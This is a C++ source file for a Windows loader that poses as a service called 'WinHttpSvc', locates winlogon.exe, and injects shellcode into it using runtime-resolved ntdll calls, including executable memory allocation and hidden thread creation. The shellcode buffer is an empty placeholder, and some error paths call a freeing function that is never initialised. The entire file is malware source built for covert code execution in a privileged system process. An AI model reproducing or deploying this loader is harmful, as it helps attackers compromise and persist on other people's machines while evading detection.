#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

typedef NTSTATUS(WINAPI* PFNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPTHREAD_START_ROUTINE StartRoutine,
    IN LPVOID Argument,
    IN ULONG CreateFlags, 
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList
    );

typedef NTSTATUS(NTAPI* PFNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(WINAPI* PFNtWriteVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN ULONG NumberOfBytesToWrite,
    OUT PULONG NumberOfBytesWritten OPTIONAL
    );

typedef NTSTATUS(NTAPI* PFNtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(NTAPI* PFNtOpenProcess)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN struct CLIENT_ID* ClientId
    );

#define SERVICE_NAME L"WinHttpSvc"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

PFNtFreeVirtualMemory pNtFreeVirtualMemory = NULL;

typedef struct CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

void ServiceMain(int argc, char* argv[]);
void ControlHandler(DWORD request);
void start(HINSTANCE handle);
bool InjectShellcode(DWORD processId);

int main(int argc, char* argv[]) {
    
    SERVICE_TABLE_ENTRY ServiceTable[2] = { { NULL, NULL }, { NULL, NULL } };
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[0].lpServiceName = const_cast<LPWSTR>(SERVICE_NAME);
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char* argv[]) {
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandlerW(SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler);

    if (hStatus == (SERVICE_STATUS_HANDLE)NULL)
        return;

    start(NULL);
    ExitProcess(0);
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    default:
        break;
    }

    return;
}

bool InjectShellcode(DWORD processId) {
    HANDLE hProcess;
    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES objectAttributes;

    clientId.UniqueProcess = (HANDLE)processId;
    clientId.UniqueThread = NULL;

    InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);

    PFNtOpenProcess pNtOpenProcess = (PFNtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess");
    if (pNtOpenProcess == NULL) {

    }


    NTSTATUS status = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
    if (!NT_SUCCESS(status)) {
        return false;
    }

    unsigned char shellcode[] = { /* shellcode aqui */ };

    SIZE_T shellcodeSize = sizeof(shellcode);

    PVOID pShellcode = NULL;
    SIZE_T regionSize = shellcodeSize;

    PFNtAllocateVirtualMemory pNtAllocateVirtualMemory = (PFNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (pNtAllocateVirtualMemory == NULL) {
        pNtFreeVirtualMemory(hProcess, &pShellcode, &regionSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    status = pNtAllocateVirtualMemory(hProcess, &pShellcode, 0, &regionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        pNtFreeVirtualMemory(hProcess, &pShellcode, &regionSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    PFNtWriteVirtualMemory pNtWriteVirtualMemory = (PFNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    if (pNtWriteVirtualMemory == NULL) {
        pNtFreeVirtualMemory(hProcess, &pShellcode, &regionSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    ULONG bytesWritten;
    status = pNtWriteVirtualMemory(hProcess, pShellcode, shellcode, shellcodeSize, &bytesWritten);
    if (!NT_SUCCESS(status) || bytesWritten != shellcodeSize) {
        pNtFreeVirtualMemory(hProcess, &pShellcode, &regionSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = NULL;
    PFNtCreateThreadEx pNtCreateThreadEx = (PFNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

    if (pNtCreateThreadEx) {
        NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0x04, 0, 0, 0, NULL);
        if (!NT_SUCCESS(status)) {
            pNtFreeVirtualMemory(hProcess, &pShellcode, &regionSize, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

void start(HINSTANCE handle) {
    DWORD targetProcessId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (lstrcmpiW(pe32.szExeFile, L"winlogon.exe") == 0) {
                targetProcessId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);

    if (targetProcessId != 0) {
        if (InjectShellcode(targetProcessId)) {
            
        }
        else {
            
        }
    }
    else {
        
    }
}
